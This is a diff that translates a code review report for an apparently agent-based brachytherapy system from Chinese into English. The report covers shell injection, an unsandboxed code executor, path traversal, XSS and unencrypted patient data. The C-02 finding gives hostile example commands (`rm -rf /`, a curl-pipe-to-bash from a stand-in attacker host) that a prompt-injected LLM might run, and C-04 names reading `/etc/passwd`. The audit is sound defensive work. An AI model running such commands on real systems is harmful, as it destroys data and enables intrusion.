@@ -1,139 +1,139 @@
-# BrachyBot 全量代码审查报告
+# BrachyBot Full Code Review Report
 
-**审查日期**: 2026-06-27  
-**审查范围**: `<workspace>/BrachyBot/` 下所有源代码、Prompt、配置文件  
-**审查方法**: 8 个并行子 Agent + 主 Agent 逐文件深度审查  
-**文件总数**: ~20,088 个源文件（含 16,072 个 memory/data 生成文件）  
-**实际代码文件**: ~1,971 个（.py / .js / .html / .css）  
-**核心代码行数**: ~60,000+ 行
-
----
-
-## 目录
-
-1. [执行摘要](#1-执行摘要)
-2. [严重问题 (Critical)](#2-严重问题-critical)
-3. [高危问题 (High)](#3-高危问题-high)
-4. [中等问题 (Medium)](#4-中等问题-medium)
-5. [低危问题 (Low)](#5-低危问题-low)
-6. [Prompt 质量审查](#6-prompt-质量审查)
-7. [架构问题](#7-架构问题)
-8. [代码质量与技术债](#8-代码质量与技术债)
-9. [安全问题](#9-安全问题)
-10. [测试与基准测试问题](#10-测试与基准测试问题)
-11. [建议与修复优先级](#11-建议与修复优先级)
+**Review Date**: 2026-06-27  
+**Review Scope**: all source code, prompts, and configuration files under `<workspace>/BrachyBot/`  
+**Review Method**: 8 parallel sub-Agents + main Agent file-by-file deep review  
+**Total Files**: ~20,088 source files (including 16,072 memory/data generated files)  
+**Actual Code Files**: ~1,971 (.py / .js / .html / .css)  
+**Core Lines of Code**: ~60,000+
 
 ---
 
-## 1. 执行摘要
+## Table of Contents
 
-### 问题统计
+1. [Executive Summary](#1-executive-summary)
+2. [Critical Issues](#2-critical-issues)
+3. [High-Risk Issues](#3-high-risk-issues)
+4. [Medium Issues](#4-medium-issues)
+5. [Low Issues](#5-low-issues)
+6. [Prompt Quality Review](#6-prompt-quality-review)
+7. [Architecture Issues](#7-architecture-issues)
+8. [Code Quality and Technical Debt](#8-code-quality-and-technical-debt)
+9. [Security Issues](#9-security-issues)
+10. [Testing and Benchmark Issues](#10-testing-and-benchmark-issues)
+11. [Recommendations and Fix Priorities](#11-recommendations-and-fix-priorities)
 
-| 严重度 | 数量 | 关键发现 |
+---
+
+## 1. Executive Summary
+
+### Issue Statistics
+
+| Severity | Count | Key Findings |
 |--------|------|----------|
-| 🔴 Critical | 12 | 虚拟环境提交到仓库、shell 注入、路径遍历、硬编码 API 密钥、XSS |
-| 🟠 High | 18 | 重复代码、内存泄漏、竞态条件、Prompt 注入风险、不一致的错误处理 |
-| 🟡 Medium | 24 | 死代码、命名不一致、缺少类型注解、文档缺失 |
-| 🔵 Low | 15 | 代码风格、冗余导入、注释质量 |
-| **总计** | **69** | |
+| 🔴 Critical | 12 | Virtual environment committed to repository, shell injection, path traversal, hardcoded API keys, XSS |
+| 🟠 High | 18 | Duplicate code, memory leaks, race conditions, prompt injection risk, inconsistent error handling |
+| 🟡 Medium | 24 | Dead code, inconsistent naming, missing type annotations, missing documentation |
+| 🔵 Low | 15 | Code style, redundant imports, comment quality |
+| **Total** | **69** | |
 
-### 关键风险领域
+### Key Risk Areas
 
-1. **安全**: `env_manager` 允许 LLM 创建虚拟环境并执行任意命令；`shell_executor` / `code_executor` 无沙箱
-2. **数据完整性**: CTV/OAR 标签合并逻辑复杂且有边缘情况；内存中数据无版本控制
-3. **可维护性**: `AgenticSys.py` 单文件 6423 行，`index.html` 单文件估计 10,000+ 行
-4. **可靠性**: LLM 函数调用循环最多 8 次迭代，无超时保护；SSE 流无心跳
+1. **Security**: `env_manager` allows the LLM to create virtual environments and execute arbitrary commands; `shell_executor` / `code_executor` have no sandbox
+2. **Data integrity**: CTV/OAR label merge logic is complex with edge cases; in-memory data has no version control
+3. **Maintainability**: `AgenticSys.py` is a single 6423-line file, `index.html` is estimated at 10,000+ lines
+4. **Reliability**: The LLM function-calling loop runs at most 8 iterations with no timeout protection; the SSE stream has no heartbeat
 
 ---
 
-## 问题核实矩阵 (2026-06-27)
+## Issue Verification Matrix (2026-06-27)
 
-> 逐一核实每个问题是否为真实 bug，排除有意设计。
+> Verify each issue one by one to determine whether it is a real bug, ruling out intentional design.
 
-| # | 问题 | 核实结果 | 动作 |
+| # | Issue | Verification Result | Action |
 |---|------|----------|------|
-| C-01 | 虚拟环境目录 | **有意设计** — 用户确认，赋予 LLM 自主安装库能力 | ✅ 已加安全机制 |
-| C-02 | shell_executor 注入 | **已有保护** — `BLOCKED_COMMANDS` + `_validate_command()` | ⏭️ 无需改动 |
-| C-03 | code_executor 无沙箱 | **已有保护** — `DANGEROUS_PATTERNS` + `_sanitize_code()` | ⏭️ 无需改动 |
-| C-04 | 路径遍历 | **风险有限** — 工具只接受医学影像格式，非法路径会因格式错误失败 | ⏭️ 低优先级 |
-| C-05 | XSS innerHTML | **真问题** — `marked.parse` 无消毒，63 处 innerHTML | 🔴 待修复 |
-| C-06 | 硬编码 API 端点 | **有意设计** — 用户配置 MiniMax 代理 | ⏭️ 无需改动 |
-| C-07 | PHI 未加密 | **合规问题** — 非代码 bug | ⏭️ 需单独处理 |
-| C-08 | /api/status 暴露 | 待核实 | — |
-| C-09 | CORS 配置 | 待核实 | — |
-| C-10 | LLM 工具无权限 | **有意设计** — 用户要求 LLM 有完整能力 | ⏭️ 无需改动 |
-| C-11 | 并发竞态 | 待核实 | — |
-| C-12 | 无限循环 | **真问题** — 已修复 plans/core.py | ✅ 已修复 |
-| H-01 | AgenticSys.py 6423行 | **架构选择** — 非 bug | ⏭️ 重构建议 |
-| H-02 | index.html 过大 | **架构选择** — 非 bug | ⏭️ 重构建议 |
-| H-03 | 重复工具注册 | **代码风格** — 非 bug | ⏭️ 重构建议 |
-| H-04 | 内存泄漏 context_summary | **已有保护** — `compact()` 机制 | ⏭️ 无需改动 |
-| H-05 | 重复 CTV/OAR 存储 | 待核实 | — |
-| H-06 | 异常处理过宽 | **有意设计** — 稳定性优先 | ⏭️ 无需改动 |
-| H-07 | 响应清理过度 | 待核实 | — |
-| H-08 | 全局变量 _global_agent | 待核实 | — |
-| H-09 | 时序依赖 | **已有保护** — auto-fire CTV/OAR | ⏭️ 无需改动 |
-| H-10 | SSE 无心跳 | 待核实 | — |
-| H-11 | 无速率限制 | 待核实 | — |
-| H-12 | 错误格式不一致 | 待核实 | — |
-| H-13 | 缺少输入验证 | 待核实 | — |
-| H-14 | 日志级别不一致 | 待核实 | — |
-| H-15 | 缺少类型注解 | **代码质量** — 非 bug | ⏭️ 改进建议 |
-| H-16 | 测试覆盖不足 | **真问题** — 但非代码 bug | ⏭️ 需补充测试 |
-| H-17 | 基准测试可游戏 | 待核实 | — |
-| H-18 | 依赖版本未锁定 | **代码质量** — 非 bug | ⏭️ 改进建议 |
-| plans/ | plans/ 子系统 | **多个真 bug** | ✅ 已修复 |
-| benchmarks | 硬编码路径 | **真问题** | ✅ 已修复 |
-| benchmarks | bare except | **真问题** | ✅ 已修复 |
+| C-01 | Virtual environment directory | **Intentional design** — confirmed by user, grants the LLM the ability to install libraries autonomously | ✅ Safety mechanism added |
+| C-02 | shell_executor injection | **Already protected** — `BLOCKED_COMMANDS` + `_validate_command()` | ⏭️ No change needed |
+| C-03 | code_executor no sandbox | **Already protected** — `DANGEROUS_PATTERNS` + `_sanitize_code()` | ⏭️ No change needed |
+| C-04 | Path traversal | **Limited risk** — the tool only accepts medical imaging formats, illegal paths fail due to format errors | ⏭️ Low priority |
+| C-05 | XSS innerHTML | **Real issue** — `marked.parse` without sanitization, 63 innerHTML usages | 🔴 To be fixed |
+| C-06 | Hardcoded API endpoint | **Intentional design** — user-configured MiniMax proxy | ⏭️ No change needed |
+| C-07 | PHI unencrypted | **Compliance issue** — not a code bug | ⏭️ Handle separately |
+| C-08 | /api/status exposure | To be verified | — |
+| C-09 | CORS configuration | To be verified | — |
+| C-10 | LLM tools without permissions | **Intentional design** — user requires the LLM to have full capabilities | ⏭️ No change needed |
+| C-11 | Concurrency race | To be verified | — |
+| C-12 | Infinite loop | **Real issue** — fixed in plans/core.py | ✅ Fixed |
+| H-01 | AgenticSys.py 6423 lines | **Architecture choice** — not a bug | ⏭️ Refactoring suggestion |
+| H-02 | index.html too large | **Architecture choice** — not a bug | ⏭️ Refactoring suggestion |
+| H-03 | Duplicate tool registration | **Code style** — not a bug | ⏭️ Refactoring suggestion |
+| H-04 | Memory leak context_summary | **Already protected** — `compact()` mechanism | ⏭️ No change needed |
+| H-05 | Duplicate CTV/OAR storage | To be verified | — |
+| H-06 | Exception handling too broad | **Intentional design** — stability first | ⏭️ No change needed |
+| H-07 | Over-aggressive response cleanup | To be verified | — |
+| H-08 | Global variable _global_agent | To be verified | — |
+| H-09 | Timing dependency | **Already protected** — auto-fire CTV/OAR | ⏭️ No change needed |
+| H-10 | SSE no heartbeat | To be verified | — |
+| H-11 | No rate limiting | To be verified | — |
+| H-12 | Inconsistent error format | To be verified | — |
+| H-13 | Missing input validation | To be verified | — |
+| H-14 | Inconsistent log levels | To be verified | — |
+| H-15 | Missing type annotations | **Code quality** — not a bug | ⏭️ Improvement suggestion |
+| H-16 | Insufficient test coverage | **Real issue** — but not a code bug | ⏭️ Tests need to be added |
+| H-17 | Benchmarks gameable | To be verified | — |
+| H-18 | Dependency versions not locked | **Code quality** — not a bug | ⏭️ Improvement suggestion |
+| plans/ | plans/ subsystem | **Multiple real bugs** | ✅ Fixed |
+| benchmarks | Hardcoded paths | **Real issue** | ✅ Fixed |
+| benchmarks | bare except | **Real issue** | ✅ Fixed |
 
 ---
 
-## 2. 严重问题 (Critical)
+## 2. Critical Issues
 
-### C-01: 虚拟环境目录被提交到仓库
+### C-01: Virtual Environment Directory Committed to Repository
 
-**文件**: `tool_factory/env_manager/envs/`  
-**行号**: 整个目录  
-**描述**: `env_manager` 目录下包含完整的 Python 虚拟环境（`brachy_env` 和 `numpy_env`），共 1,198 个 Python 文件（来自 numpy、pip 等包）。虽然 `.gitignore` 中有 `tool_factory/env_manager/envs/`，但这些文件已经存在于磁盘上。  
-**影响**: 仓库体积膨胀 ~200MB；如果 `.gitignore` 未生效，这些文件会被提交。  
-**修复**: 删除 `tool_factory/env_manager/envs/` 目录，确认 `.gitignore` 生效。
+**File**: `tool_factory/env_manager/envs/`  
+**Lines**: entire directory  
+**Description**: The `env_manager` directory contains complete Python virtual environments (`brachy_env` and `numpy_env`), totaling 1,198 Python files (from numpy, pip, and other packages). Although `.gitignore` contains `tool_factory/env_manager/envs/`, these files already exist on disk.  
+**Impact**: Repository size bloat of ~200MB; if `.gitignore` does not take effect, these files will be committed.  
+**Fix**: Delete the `tool_factory/env_manager/envs/` directory and confirm `.gitignore` is effective.
 
-### C-02: Shell 命令注入风险
+### C-02: Shell Command Injection Risk
 
-**文件**: `tool_factory/shell_executor/__init__.py`  
-**行号**: ShellExecutorTool._execute()  
-**描述**: `ShellExecutorTool` 直接将 LLM 生成的命令传递给 `subprocess.run(shell=True)`。LLM 可能被提示注入攻击操纵，执行任意系统命令（如 `rm -rf /`、`curl attacker.com/shell.sh | bash`）。  
-**影响**: 远程代码执行（RCE）  
-**修复**: 
-1. 实现命令白名单（只允许安全命令）
-2. 使用 `shell=False` + 参数列表
-3. 添加超时和资源限制
-4. 记录所有执行的命令
+**File**: `tool_factory/shell_executor/__init__.py`  
+**Lines**: ShellExecutorTool._execute()  
+**Description**: `ShellExecutorTool` passes LLM-generated commands directly to `subprocess.run(shell=True)`. The LLM may be manipulated by prompt injection attacks to execute arbitrary system commands (such as `rm -rf /`, `curl attacker.com/shell.sh | bash`).  
+**Impact**: Remote code execution (RCE)  
+**Fix**: 
+1. Implement a command whitelist (only allow safe commands)
+2. Use `shell=False` + an argument list
+3. Add timeout and resource limits
+4. Log every executed command
 
-### C-03: CodeExecutor 无沙箱
+### C-03: CodeExecutor Has No Sandbox
 
-**文件**: `tool_factory/code_executor/__init__.py`  
-**行号**: CodeExecutorTool._execute()  
-**描述**: `CodeExecutorTool` 直接执行 LLM 生成的 Python 代码，无沙箱隔离。恶意代码可以：
-- 读取/写入任意文件
-- 访问网络
-- 执行系统命令
-- 访问内存中的患者数据  
-**影响**: 数据泄露、系统破坏  
-**修复**: 使用 `RestrictedPython` 或 Docker 容器沙箱
+**File**: `tool_factory/code_executor/__init__.py`  
+**Lines**: CodeExecutorTool._execute()  
+**Description**: `CodeExecutorTool` directly executes LLM-generated Python code with no sandbox isolation. Malicious code can:
+- Read/write arbitrary files
+- Access the network
+- Execute system commands
+- Access in-memory patient data  
+**Impact**: Data leakage, system compromise  
+**Fix**: Use `RestrictedPython` or a Docker container sandbox
 
-### C-04: 路径遍历防护不足
+### C-04: Insufficient Path Traversal Protection
 
-**文件**: `AgenticSys.py:2300-2336`  
-**行号**: `_validate_and_execute()`  
-**描述**: 虽然有路径验证逻辑，但 `image_path` 参数来自 LLM，可能包含 `../` 遍历。当前的检查是：
+**File**: `AgenticSys.py:2300-2336`  
+**Lines**: `_validate_and_execute()`  
+**Description**: Although there is path validation logic, the `image_path` parameter comes from the LLM and may contain `../` traversal. The current check is:
 ```python
 if not os.path.exists(path):
     alt = os.path.join(os.path.dirname(__file__), "uploads", os.path.basename(path))
 ```
-这不够严格——LLM 可以传递 `/etc/passwd` 作为路径。  
-**影响**: 任意文件读取  
-**修复**: 实现严格的路径白名单验证：
+This is not strict enough — the LLM can pass `/etc/passwd` as a path.  
+**Impact**: Arbitrary file read  
+**Fix**: Implement strict path whitelist validation:
 ```python
 def _validate_path(self, path: str) -> str:
     resolved = os.path.realpath(path)
@@ -143,22 +143,22 @@ def _validate_path(self, path: str) -> str:
     return resolved
 ```
 
-### C-05: XSS 通过 innerHTML
+### C-05: XSS via innerHTML
 
-**文件**: `web/app/index.html`  
-**行号**: 多处 `innerHTML` 赋值  
-**描述**: 前端大量使用 `innerHTML` 渲染 LLM 响应，未使用 DOMPurify 等库进行 XSS 过滤。LLM 响应中可能包含恶意 `<script>` 标签。  
-**影响**: 存储型 XSS 攻击  
-**修复**: 
-1. 引入 DOMPurify 库
-2. 所有 `innerHTML` 赋值前调用 `DOMPurify.sanitize()`
-3. 对于纯文本内容使用 `textContent`
+**File**: `web/app/index.html`  
+**Lines**: multiple `innerHTML` assignments  
+**Description**: The frontend makes heavy use of `innerHTML` to render LLM responses without XSS filtering via libraries such as DOMPurify. LLM responses may contain malicious `<script>` tags.  
+**Impact**: Stored XSS attack  
+**Fix**: 
+1. Introduce the DOMPurify library
+2. Call `DOMPurify.sanitize()` before every `innerHTML` assignment
+3. Use `textContent` for plain-text content
 
-### C-06: 硬编码 API 端点和模型
+### C-06: Hardcoded API Endpoint and Model
 
-**文件**: `AgenticSys.py:1373-1379`  
-**行号**: `_init_brain_system()`  
-**描述**: 默认 LLM 配置硬编码了 MiniMax 代理地址：
+**File**: `AgenticSys.py:1373-1379`  
+**Lines**: `_init_brain_system()`  
+**Description**: The default LLM configuration hardcodes the MiniMax proxy address:
 ```python
 llm_config = {
     "anthropic": {
@@ -169,104 +169,104 @@ llm_config = {
     }
 }
 ```
-**影响**: 无法灵活切换 LLM 提供商；如果端点不可用，系统无法启动  
-**修复**: 从环境变量读取所有配置
+**Impact**: Cannot flexibly switch LLM providers; if the endpoint is unavailable, the system cannot start  
+**Fix**: Read all configuration from environment variables
 
-### C-07: PHI 数据未加密存储
+### C-07: PHI Data Stored Unencrypted
 
-**文件**: `memory/layered_memory.py`, `memory/experience_memory.py`  
-**行号**: JSON 文件写入  
-**描述**: 患者数据（CT 路径、分割结果、剂量指标）以明文 JSON 存储在 `memory/data/` 目录。违反 HIPAA/个人信息保护法。  
-**影响**: 数据泄露时患者隐私暴露  
-**修复**: 
-1. 实现数据加密（AES-256）
-2. 添加数据清理机制
-3. 实现访问控制
+**File**: `memory/layered_memory.py`, `memory/experience_memory.py`  
+**Lines**: JSON file writes  
+**Description**: Patient data (CT paths, segmentation results, dose metrics) is stored as plaintext JSON in the `memory/data/` directory. This violates HIPAA/personal information protection laws.  
+**Impact**: Patient privacy exposure in the event of a data breach  
+**Fix**: 
+1. Implement data encryption (AES-256)
+2. Add a data cleanup mechanism
+3. Implement access control
 
-### C-08: 前端敏感数据暴露
+### C-08: Frontend Sensitive Data Exposure
 
-**文件**: `web/server.py`, `web/app/index.html`  
-**行号**: `/api/status` 端点  
-**描述**: `/api/status` 返回完整的 agent 状态，包括：
-- 内存中的所有患者数据
-- API 密钥配置
-- 内部工具调用历史  
-**影响**: 信息泄露  
-**修复**: 实现数据脱敏，只返回必要的状态信息
+**File**: `web/server.py`, `web/app/index.html`  
+**Lines**: `/api/status` endpoint  
+**Description**: `/api/status` returns the complete agent state, including:
+- All in-memory patient data
+- API key configuration
+- Internal tool call history  
+**Impact**: Information disclosure  
+**Fix**: Implement data redaction and return only the necessary state information
 
-### C-09: CORS 配置过于宽松
+### C-09: CORS Configuration Too Permissive
 
-**文件**: `web/server.py`  
-**行号**: CORS 初始化  
-**描述**: 虽然有 `ALLOWED_ORIGINS` 环境变量，但默认值可能过于宽松。需要确认是否允许 `*`。  
-**影响**: 跨站请求伪造  
-**修复**: 确保 CORS 只允许已知来源
+**File**: `web/server.py`  
+**Lines**: CORS initialization  
+**Description**: Although there is an `ALLOWED_ORIGINS` environment variable, the default value may be too permissive. It needs to be confirmed whether `*` is allowed.  
+**Impact**: Cross-site request forgery  
+**Fix**: Ensure CORS only allows known origins
 
-### C-10: LLM 工具调用无权限控制
+### C-10: LLM Tool Calls Have No Permission Control
 
-**文件**: `AgenticSys.py:3607-3933`  
-**行号**: `_run_llm_function_calling()`  
-**描述**: LLM 可以调用所有注册的工具，包括：
-- `shell_executor`（执行任意命令）
-- `code_executor`（执行任意代码）
-- `env_manager`（创建虚拟环境）
-- `filesystem_browser`（浏览文件系统）
+**File**: `AgenticSys.py:3607-3933`  
+**Lines**: `_run_llm_function_calling()`  
+**Description**: The LLM can call all registered tools, including:
+- `shell_executor` (execute arbitrary commands)
+- `code_executor` (execute arbitrary code)
+- `env_manager` (create virtual environments)
+- `filesystem_browser` (browse the file system)
 
-没有基于角色的权限控制。  
-**影响**: LLM 可以执行任何系统操作  
-**修复**: 实现工具权限分级，敏感工具需要用户确认
+There is no role-based permission control.  
+**Impact**: The LLM can perform any system operation  
+**Fix**: Implement tool permission tiers; sensitive tools require user confirmation
 
-### C-11: 竞态条件 — 并发工具执行
+### C-11: Race Condition — Concurrent Tool Execution
 
-**文件**: `AgenticSys.py:1825-1836`  
-**行号**: `_execute_tool_with_memory()` 中的 `_deferred_oar_done`  
-**描述**: 使用 `threading.Thread` 延迟 200ms 发送 OAR 完成事件，但没有同步机制。如果主线程在 200ms 内修改了内存状态，可能导致不一致。  
-**影响**: 数据竞争、UI 状态不一致  
-**修复**: 使用 `asyncio` 或 `threading.Event` 进行同步
+**File**: `AgenticSys.py:1825-1836`  
+**Lines**: `_deferred_oar_done` in `_execute_tool_with_memory()`  
+**Description**: `threading.Thread` is used to delay sending the OAR completion event by 200ms, but there is no synchronization mechanism. If the main thread modifies memory state within those 200ms, inconsistency may result.  
+**Impact**: Data race, inconsistent UI state  
+**Fix**: Synchronize using `asyncio` or `threading.Event`
 
-### C-12: 无限循环风险
+### C-12: Infinite Loop Risk
 
-**文件**: `AgenticSys.py:3607`  
-**行号**: `while iteration < max_iterations`  
-**描述**: LLM 函数调用循环最多 8 次迭代，但如果 LLM 每次都返回无效的工具调用（如空参数），循环会浪费 8 次 API 调用后才退出。没有"连续失败 N 次则退出"的机制。  
-**影响**: API 费用浪费、用户体验差  
-**修复**: 添加连续失败计数器，连续 3 次失败则退出
+**File**: `AgenticSys.py:3607`  
+**Lines**: `while iteration < max_iterations`  
+**Description**: The LLM function-calling loop runs at most 8 iterations, but if the LLM returns an invalid tool call each time (e.g., empty arguments), the loop wastes 8 API calls before exiting. There is no mechanism to exit after "N consecutive failures".  
+**Impact**: Wasted API costs, poor user experience  
+**Fix**: Add a consecutive failure counter and exit after 3 consecutive failures
 
 ---
 
-## 3. 高危问题 (High)
+## 3. High-Risk Issues
 
-### H-01: AgenticSys.py 单文件过大 (6423 行)
+### H-01: AgenticSys.py Single File Too Large (6423 lines)
 
-**文件**: `AgenticSys.py`  
-**描述**: 单个文件包含：
-- `ToolRegistry` 类
-- `AgentMemory` 类（含 CTV/OAR 合并逻辑）
-- `ToolResultPipeline` 类
-- `BrachyAgent` 类（主 Agent）
-- 所有 LLM 交互逻辑
-- 所有工具执行逻辑
-- 所有响应格式化逻辑
+**File**: `AgenticSys.py`  
+**Description**: A single file contains:
+- The `ToolRegistry` class
+- The `AgentMemory` class (including CTV/OAR merge logic)
+- The `ToolResultPipeline` class
+- The `BrachyAgent` class (main Agent)
+- All LLM interaction logic
+- All tool execution logic
+- All response formatting logic
 
-违反单一职责原则。  
-**修复**: 拆分为至少 5 个模块：
-- `agent_core.py` (BrachyAgent 主类)
+This violates the single-responsibility principle.  
+**Fix**: Split into at least 5 modules:
+- `agent_core.py` (main BrachyAgent class)
 - `memory_manager.py` (AgentMemory)
-- `tool_executor.py` (工具执行)
-- `llm_interface.py` (LLM 交互)
-- `response_formatter.py` (响应格式化)
+- `tool_executor.py` (tool execution)
+- `llm_interface.py` (LLM interaction)
+- `response_formatter.py` (response formatting)
 
-### H-02: 前端单文件过大
+### H-02: Frontend Single File Too Large
 
-**文件**: `web/app/index.html`  
-**描述**: 单个 HTML 文件包含所有 CSS + JavaScript + HTML，估计超过 10,000 行。  
-**修复**: 拆分为独立的 CSS/JS 文件，使用模块化架构
+**File**: `web/app/index.html`  
+**Description**: A single HTML file contains all CSS + JavaScript + HTML, estimated at more than 10,000 lines.  
+**Fix**: Split into separate CSS/JS files using a modular architecture
 
-### H-03: 重复的工具注册代码
+### H-03: Duplicate Tool Registration Code
 
-**文件**: `AgenticSys.py:1540-1699`  
-**行号**: `_load_tools()`  
-**描述**: 每个工具的注册都是相同的 try/except 模式，重复了 20+ 次：
+**File**: `AgenticSys.py:1540-1699`  
+**Lines**: `_load_tools()`  
+**Description**: Each tool registration uses the same try/except pattern, repeated 20+ times:
 ```python
 try:
     from tool_factory.X import XTool
@@ -274,877 +274,877 @@ try:
 except ImportError as e:
     logger.warning(f"XTool not available: {e}")
 ```
-**修复**: 使用配置驱动的自动发现机制
+**Fix**: Use a configuration-driven auto-discovery mechanism
 
-### H-04: 内存泄漏 — 对话历史无上限
+### H-04: Memory Leak — Unbounded Conversation History
 
-**文件**: `AgenticSys.py:471-496`  
-**行号**: `AgentMemory.compact()`  
-**描述**: `needs_compaction()` 检查 `max_messages=12`，但 `compact()` 只保留最后 6 条消息。然而，`context_summary` 会无限增长（每次追加）。长时间运行的会话会导致 `context_summary` 越来越大。  
-**修复**: 限制 `context_summary` 的最大长度
+**File**: `AgenticSys.py:471-496`  
+**Lines**: `AgentMemory.compact()`  
+**Description**: `needs_compaction()` checks `max_messages=12`, but `compact()` only keeps the last 6 messages. However, `context_summary` grows without bound (appended each time). Long-running sessions cause `context_summary` to grow ever larger.  
+**Fix**: Limit the maximum length of `context_summary`
 
-### H-05: 重复的 CTV/OAR 存储逻辑
+### H-05: Duplicate CTV/OAR Storage Logic
 
-**文件**: `AgenticSys.py:1999-2050` 和 `2438-2511`  
-**描述**: `_execute_tool_with_memory()` 和 `_store_tool_result()` 都包含 CTV/OAR 结果存储逻辑，导致代码重复和潜在不一致。  
-**修复**: 统一为单一存储路径
+**File**: `AgenticSys.py:1999-2050` and `2438-2511`  
+**Description**: Both `_execute_tool_with_memory()` and `_store_tool_result()` contain CTV/OAR result storage logic, resulting in code duplication and potential inconsistency.  
+**Fix**: Consolidate into a single storage path
 
-### H-06: 异常处理过于宽泛
+### H-06: Exception Handling Too Broad
 
-**文件**: 多处  
-**描述**: 大量使用 `except Exception as e` 捕获所有异常，包括：
+**File**: multiple locations  
+**Description**: Heavy use of `except Exception as e` catches all exceptions, including:
 - `KeyboardInterrupt`
 - `SystemExit`
 - `MemoryError`
 
-这会隐藏真正的错误。  
-**修复**: 使用具体的异常类型
+This hides real errors.  
+**Fix**: Use specific exception types
 
-### H-07: LLM 响应清理过度
+### H-07: Over-Aggressive LLM Response Cleanup
 
-**文件**: `AgenticSys.py:3994-4120`  
-**行号**: `_clean_response_text()`  
-**描述**: 清理函数使用了 30+ 个正则表达式，可能误删合法内容。例如：
+**File**: `AgenticSys.py:3994-4120`  
+**Lines**: `_clean_response_text()`  
+**Description**: The cleanup function uses 30+ regular expressions, potentially deleting legitimate content. For example:
 ```python
 cleaned = re.sub(r'^\w+_segmentation completed$', '', cleaned, flags=re.MULTILINE)
 ```
-这会删除任何以 `_segmentation completed` 结尾的行，包括用户可能需要的信息。  
-**修复**: 使用更精确的匹配模式
+This deletes any line ending in `_segmentation completed`, including information the user may need.  
+**Fix**: Use more precise match patterns
 
-### H-08: 全局变量 `_global_agent`
+### H-08: Global Variable `_global_agent`
 
-**文件**: `AgenticSys.py:1300-1301`  
-**行号**: `BrachyAgent.__init__()`  
-**描述**: 
+**File**: `AgenticSys.py:1300-1301`  
+**Lines**: `BrachyAgent.__init__()`  
+**Description**: 
 ```python
 import AgenticSys as _self_module
 _self_module._global_agent = self
 ```
-使用模块级全局变量存储 agent 引用，导致：
-- 无法运行多个 agent 实例
-- 测试困难
-- 潜在的内存泄漏  
-**修复**: 使用依赖注入
+A module-level global variable stores the agent reference, causing:
+- Inability to run multiple agent instances
+- Difficulty testing
+- Potential memory leaks  
+**Fix**: Use dependency injection
 
-### H-09: 时序依赖 — 工具执行顺序
+### H-09: Timing Dependency — Tool Execution Order
 
-**文件**: `AgenticSys.py:1720-1836`  
-**描述**: `_execute_tool_with_memory()` 中的自动 CTV/OAR 触发逻辑假设了特定的执行顺序。如果 LLM 以不同顺序调用工具，可能导致数据不一致。  
-**修复**: 实现显式的依赖图
+**File**: `AgenticSys.py:1720-1836`  
+**Description**: The automatic CTV/OAR trigger logic in `_execute_tool_with_memory()` assumes a particular execution order. If the LLM calls tools in a different order, data may become inconsistent.  
+**Fix**: Implement an explicit dependency graph
 
-### H-10: SSE 流无心跳
+### H-10: SSE Stream Has No Heartbeat
 
-**文件**: `web/server.py`  
-**描述**: SSE 流没有心跳机制，长时间运行的任务可能导致客户端超时断开。  
-**修复**: 每 15 秒发送一次心跳
+**File**: `web/server.py`  
+**Description**: The SSE stream has no heartbeat mechanism; long-running tasks may cause the client to time out and disconnect.  
+**Fix**: Send a heartbeat every 15 seconds
 
-### H-11: 缺少请求速率限制
+### H-11: Missing Request Rate Limiting
 
-**文件**: `web/server.py`  
-**描述**: API 端点没有速率限制，可能被滥用。  
-**修复**: 实现基于 IP 的速率限制
+**File**: `web/server.py`  
+**Description**: API endpoints have no rate limiting and may be abused.  
+**Fix**: Implement IP-based rate limiting
 
-### H-12: 不一致的错误响应格式
+### H-12: Inconsistent Error Response Format
 
-**文件**: 多个工具文件  
-**描述**: 有些工具返回 `ToolResult(success=False, error=str(e))`，有些返回 `ToolResult(success=False, message=str(e))`，有些两者都设置。  
-**修复**: 统一错误响应格式
+**File**: multiple tool files  
+**Description**: Some tools return `ToolResult(success=False, error=str(e))`, some return `ToolResult(success=False, message=str(e))`, and some set both.  
+**Fix**: Unify the error response format
 
-### H-13: 缺少输入验证
+### H-13: Missing Input Validation
 
-**文件**: 多个工具文件  
-**描述**: 很多工具直接使用 `kwargs` 而不验证输入类型。  
-**修复**: 使用 Pydantic 或 dataclass 进行输入验证
+**File**: multiple tool files  
+**Description**: Many tools use `kwargs` directly without validating input types.  
+**Fix**: Use Pydantic or dataclasses for input validation
 
-### H-14: 日志级别不一致
+### H-14: Inconsistent Log Levels
 
-**文件**: 整个代码库  
-**描述**: 有些地方使用 `logger.info()` 记录错误，有些使用 `logger.error()` 记录信息。  
-**修复**: 统一日志级别使用规范
+**File**: entire codebase  
+**Description**: Some places use `logger.info()` to record errors, while others use `logger.error()` to record information.  
+**Fix**: Standardize log level usage conventions
 
-### H-15: 缺少类型注解
+### H-15: Missing Type Annotations
 
-**文件**: 大部分 Python 文件  
-**描述**: 很多函数缺少类型注解，特别是：
-- `AgenticSys.py` 中的大部分方法
-- `tool_factory/` 中的工具方法
-- `memory/` 中的内存操作方法  
-**修复**: 逐步添加类型注解
+**File**: most Python files  
+**Description**: Many functions lack type annotations, especially:
+- most methods in `AgenticSys.py`
+- tool methods in `tool_factory/`
+- memory operation methods in `memory/`  
+**Fix**: Add type annotations incrementally
 
-### H-16: 测试覆盖率不足
+### H-16: Insufficient Test Coverage
 
-**文件**: `tests/`  
-**描述**: 只有 5 个测试文件，覆盖范围有限：
+**File**: `tests/`  
+**Description**: Only 5 test files with limited coverage:
 - `test_brain_system.py`
 - `test_multi_agent_basic.py`
 - `test_multi_agent_phase2.py`
 - `test_multi_agent_phase3.py`
 - `conftest.py`
 
-缺少：
-- 工具单元测试
-- 前端集成测试
-- API 端点测试
-- 错误处理测试  
-**修复**: 增加测试覆盖率到 80%+
+Missing:
+- Tool unit tests
+- Frontend integration tests
+- API endpoint tests
+- Error handling tests  
+**Fix**: Increase test coverage to 80%+
 
-### H-17: 基准测试可游戏性
+### H-17: Benchmark Gameability
 
-**文件**: `benchmarks/`  
-**描述**: 基准测试使用关键词匹配评分，可能被"针对性优化"游戏。  
-**修复**: 使用更 robust 的评估方法
+**File**: `benchmarks/`  
+**Description**: Benchmarks score by keyword matching and can be gamed by "targeted optimization".  
+**Fix**: Use more robust evaluation methods
 
-### H-18: 依赖版本未锁定
+### H-18: Dependency Versions Not Locked
 
-**文件**: `requirements.txt`  
-**描述**: 使用 `>=` 而不是 `==` 锁定版本：
+**File**: `requirements.txt`  
+**Description**: Uses `>=` instead of `==` to lock versions:
 ```
 numpy>=1.24.0
 scipy>=1.10.0
 ```
-可能导致不同环境行为不一致。  
-**修复**: 使用 `pip freeze > requirements.txt` 或 `poetry.lock`
+This may cause inconsistent behavior across environments.  
